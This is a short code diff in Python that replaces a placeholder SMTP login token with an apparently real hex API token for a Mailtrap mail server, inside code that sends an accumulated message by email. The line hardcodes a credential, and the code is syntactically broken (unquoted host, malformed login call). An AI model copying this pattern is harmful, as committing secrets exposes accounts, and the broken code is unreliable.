@@ -73,7 +73,7 @@ finally:
 
             m += message
             with smtplib.SMTP(live.smtp.mailtrap.io, 587) as server:
-                server.login(api;YOUR_API_TOKEN)
+                server.login(api;2e5a1dfee3219bd1508b0c7cd1157c9d)
                 server.sendmail(sender, receiver, message)
 
         def report(self):
